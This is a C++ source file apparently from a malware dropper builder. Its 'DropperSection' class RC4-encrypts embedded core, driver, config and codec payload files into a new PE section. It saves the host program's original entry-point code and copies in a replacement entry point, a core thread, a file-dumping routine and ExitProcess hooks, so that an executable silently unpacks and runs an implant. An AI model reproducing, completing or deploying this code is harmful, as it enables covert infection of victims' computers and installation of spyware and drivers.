#include <iostream>
#include <fstream>

#include "PEObject.h"
#include "DropperSection.h"
#include "XRefNames.h"
#include "rc4.h"

using namespace std;

extern char* _needed_strings[];
extern XREFNAMES data_imports[];

void rc4crypt(const unsigned char *key, size_t keylen,
			  unsigned char *data, size_t data_len);

DropperSection::DropperSection(PEObject& pe, string name, DWORD FileAlignment)
:  GenericSection(pe, name, FileAlignment), _manifestOffset(0)
{
	_files.core.buffer = NULL; _files.core.size = 0;
	_files.config.buffer = NULL; _files.config.size = 0;
	_files.codec.buffer = NULL; _files.codec.size = 0;
	_files.driver.buffer = NULL; _files.driver.size = 0;
	
	int i = 0;
	while (_needed_strings[i] != NULL) {
		_strings.push_back(std::string(_needed_strings[i]));
		i++;
	}
}

DropperSection::~DropperSection(void)
{
}

DWORD DropperSection::build( WINSTARTFUNC OriginalEntryPoint )
{
	DWORD dataBufferSize = 0;
	
	unsigned int buffer_size = 65535 // account for header and accessory data (strings, calls, etc)
		+ _files.codec.size
		+ _files.core.size
		+ _files.config.size
		+ _files.driver.size
		+ _manifest.size();
	
	_data = new char[alignTo(buffer_size, this->FileAlignment())];
	char * ptr = _data;
	
	DataSectionHeader* header = (DataSectionHeader*)ptr;
	memset(header, 0, sizeof(DataSectionHeader));
	ptr += sizeof(DataSectionHeader);
	
	// Generate ecryption key
	string rc4_key;
	generate_key(rc4_key, sizeof(header->rc4key));
	memcpy(header->rc4key, rc4_key.c_str(), sizeof(header->rc4key));
	
	cout << "Key       : " << rc4_key << endl;
	cout << "Key length: " << dec << sizeof(header->rc4key) << endl;	
	
	// Original EP
	header->pfn_OriginalEntryPoint = OriginalEntryPoint;
	
	// ExitProcess index
	header->exitProcessIndex = _exitProcessIndex;
	header->exitIndex = _exitIndex;
	
	// Strings offsets
	header->stringsOffsets.offset = ptr - _data;
	DWORD * strOffset = (DWORD *) ptr;
	ptr += _strings.size() * sizeof(DWORD);
	
	// Strings
	header->strings.offset = ptr - _data;
	
	for ( std::list<std::string>::iterator iter = _strings.begin();
		iter != _strings.end(); 
		iter++ )
	{
		// store offset of string
		(*strOffset) = ptr - (header->strings.offset + _data); strOffset++;
		
		// store string data
		(void) memcpy( ptr, (*iter).c_str(), (*iter).size() + 1);
		
		ptr += (*iter).size() + 1;
	}
	header->strings.size = ptr - (_data + header->strings.offset);
	
	// Calls
	header->dlls.offset = ptr - _data;
	DWORD totalCalls = 0;
	for ( int i = 0; data_imports[i].dll; i++ )
	{
		// account for nCalls field
		char* ptrToNCalls = ptr;
		ptr += sizeof(DWORD);
		
		// dll name
		(void) memcpy( ptr, data_imports[i].dll, strlen(data_imports[i].dll) + 1 );
		ptr += (UINT)strlen(data_imports[i].dll) + 1;
		
		// copy call names
		DWORD nCalls = 0;
		for ( int iD = 0; data_imports[i].calls[iD] != NULL; iD++ )
		{
			(void) memcpy( ptr, data_imports[i].calls[iD], strlen(data_imports[i].calls[iD]) + 1);
			ptr += (UINT)strlen(data_imports[i].calls[iD]) + 1;
			nCalls++;
		}
		
		// fill nCalls field
		memcpy(ptrToNCalls, &nCalls, sizeof(nCalls));
		totalCalls += nCalls;
	}
	header->dlls.size = ptr - (_data + header->dlls.offset);
	
	// reserve space for Dll calls addresses
	header->callAddresses.offset = ptr - _data;
	header->callAddresses.size = totalCalls * sizeof(DWORD);
	ptr += header->callAddresses.size;
	
	// embed core, driver, config and codec files
	ptr = _embedFile(header->rc4key, _files.core, header->files.names.core, header->files.core, ptr);
	ptr = _embedFile(header->rc4key, _files.driver, header->files.names.driver, header->files.driver, ptr);
	ptr = _embedFile(header->rc4key, _files.config, header->files.names.config, header->files.config, ptr);
	ptr = _embedFile(header->rc4key, _files.codec, header->files.names.codec, header->files.codec, ptr);
	
	// save original OEP code
	memcpy(ptr, _originalOEPCode, _originalOEPCodeSize);
	header->originalOEPCode.offset = ptr - _data;
	header->originalOEPCode.size = _originalOEPCodeSize;
	ptr += _originalOEPCodeSize;
	
	// compute total data section size and store in buffer
	dataBufferSize = ptr - _data;
	memcpy(ptr, &dataBufferSize, sizeof(dataBufferSize));
	ptr += sizeof(dataBufferSize);
	
	// END marker
	memcpy(ptr, "<E>\0", 4);
	ptr += 4;
	
	// find new EP and copy dropper code in it
	DWORD newEP = ptr - _data;
	ptr += _embedFunction((PVOID)NewEntryPoint, (PVOID)NewEntryPoint_End, header->functions.newEntryPoint, ptr);
	cout << "NewEntryPoint is " << header->functions.newEntryPoint.size << " bytes long, offset " << header->functions.newEntryPoint.offset << endl;
	
	// CoreThreadProc code
	ptr += _embedFunction((PVOID)CoreThreadProc, (PVOID)CoreThreadProc_End, header->functions.coreThread, ptr);
	cout << "CoreThreadProc is " << header->functions.coreThread.size << " bytes long, offset " << header->functions.coreThread.offset << endl;
	
	// DumpFile code
	ptr += _embedFunction((PVOID)DumpFile, (PVOID)DumpFile_End, header->functions.dumpFile, ptr);
	cout << "DumpFile is " << header->functions.dumpFile.size << " bytes long, offset " << header->functions.dumpFile.offset << endl;
	
	// ExitProcessHook data
	// DWORD offsetToExitProcessHookData = ptr - _data;
	// memcpy(ptr, &offsetToExitProcessHookData, sizeof(DWORD));
	*((DWORD*) ptr) = ptr - _data;
	ptr += sizeof(DWORD);
	
	// END marker
	memcpy(ptr, "<E>\0", 4);
	ptr += 4;	
	
	// ExitProcessHook code
	ptr += _embedFunction((PVOID)ExitProcessHook, (PVOID)ExitProcessHook_End, header->functions.exitProcessHook, ptr);
	cout << "ExitProcessHook is " << header->functions.exitProcessHook.size << " bytes long, offset " << header->functions.exitProcessHook.offset << endl;

	// ExitHook code
	ptr += _embedFunction((PVOID)ExitHook, (PVOID)ExitHook_End, header->functions.exitHook, ptr);
	cout << "ExitHook is " << header->functions.exitHook.size << " bytes long, offset " << header->functions.exitHook.offset << endl;
	
	// RC4 code
	ptr += _embedFunction((PVOID)rc4_skip, (PVOID)rc4_skip_End, header->functions.rc4, ptr);
	cout << "RC4 is " << header->functions.rc4.size << " bytes long, offset " << (DWORD)header->functions.rc4.offset << endl;
	
	// compute total size
	size_t virtualSize = ptr - _data;
	_size = this->alignTo(virtualSize, this->FileAlignment());
	
	cout << "Total dropper size is " << _size << " bytes." << endl;
	
	// update section data
	SetSizeOfRawData(this->alignTo(_size, FileAlignment() ));
	SetVirtualSize(virtualSize);
	
	// return offset to new EP
	return newEP;
}

bool DropperSection::addCoreFile( std::string path, std::string name )
{
	cout << "Adding core file \"" << path << "\" as \"" << name << "\"." << endl;
	_files.core.name = name;
	return _readFile(path, _files.core);	
}

bool DropperSection::addDriverFile( std::string path, std::string name )
{
	cout << "Adding driver file \"" << path << "\" as \"" << name << "\"." << endl;
	_files.driver.name = name;
	return _readFile(path, _files.driver);
}

bool DropperSection::addConfigFile( std::string path, std::string name )
{
	cout << "Adding config file \"" << path << "\" as \"" << name << "\"." << endl;
	_files.config.name = name;
	return _readFile(path, _files.config);
}

bool DropperSection::addCodecFile( std::string path, std::string name )
{
	cout << "Adding codec file \"" << path << "\" as \"" << name << "\"." << endl;
	_files.codec.name = name;
	return _readFile(path, _files.codec);
}

int DropperSection::_embedFunction( PVOID funcStart, PVOID funcEnd , DataSectionBlob& func, char *ptr )
{
	DWORD size = (DWORD)funcEnd - (DWORD)funcStart;
	memcpy(ptr, (PBYTE) funcStart, size);
	func.offset = ptr - _data;
	func.size = size;

	return size;
}

char* DropperSection::_embedFile(char* rc4key, NamedFileBuffer& source, DataSectionBlob& name, DataSectionCryptoPack& file, char* ptr )
{
	// check if we have some data to be appended
	if (source.buffer == NULL && source.size <= 0)
		return ptr;
	
	// copy name of file
	name.offset = ptr - _data;
	name.size = source.name.size() + 1;
	memcpy(ptr, source.name.c_str(), name.size);
	ptr += name.size;
	
#if 0
	// encrypt data
	int insize = source.size;
	
	char* packed = new char[aP_max_packed_size(insize)];
	if (packed == NULL)
		return 0;
	char* workmem = new char[aP_workmem_size(insize)];
	if (packed == NULL)
		return 0;
	
	int packed_size = aPsafe_pack(source.buffer, packed, insize, workmem, NULL, NULL);
	if (workmem)
		delete [] workmem;
#endif

	char* packed = source.buffer;
	int packed_size = source.size;

	file.offset = ptr - _data;
	file.size = packed_size;

	// crypt and write file
	rc4crypt((unsigned char*)rc4key, RC4KEYLEN, (unsigned char*)packed, packed_size);
	memcpy(ptr, packed, packed_size);
	ptr += packed_size;
	
	// XXX uncomment
	// delete [] packed;
	
	return ptr;
}

bool DropperSection::_readFile( std::string path, NamedFileBuffer& buffer )
{
	std::ifstream file(path.c_str(), ios::binary);
	
	if (!file.is_open())
		return false;
	
	// get length of file
	
	file.seekg(0, ios::end);
	buffer.size = file.tellg();
	file.seekg(0, ios::beg);
	
	buffer.buffer = new char[buffer.size];
	
	file.read(buffer.buffer, buffer.size);
	file.close();
	
	return true;
}

void DropperSection::setOriginalOEPCode( unsigned char const * const code, size_t size )
{
	_originalOEPCode = new unsigned char[size];
	memcpy(_originalOEPCode, code, size);
	_originalOEPCodeSize = size;
}

void rc4crypt(const unsigned char *key, size_t keylen,
			  unsigned char *data, size_t data_len)
{
	unsigned int i, j, k;
	unsigned char *pos;
	unsigned char S[256];
	size_t kpos;
	size_t skip = 0;

	/* Setup RC4 state */
	for (i = 0; i < 256; i++)
		S[i] = i;
	j = 0;
	kpos = 0;
	for (i = 0; i < 256; i++) {
		j = (j + S[i] + key[kpos]) & 0xff;
		kpos++;
		if (kpos >= keylen)
			kpos = 0;
		S_SWAP(i, j);
	}

	/* Skip the start of the stream */
	i = j = 0;
	for (k = 0; k < skip; k++) {
		i = (i + 1) & 0xff;
		j = (j + S[i]) & 0xff;
		S_SWAP(i, j);
	}

	/* Apply RC4 to data */
	pos = data;
	for (k = 0; k < data_len; k++) {
		i = (i + 1) & 0xff;
		j = (j + S[i]) & 0xff;
		S_SWAP(i, j);
		*pos++ ^= S[(S[i] + S[j]) & 0xff];
	}
}
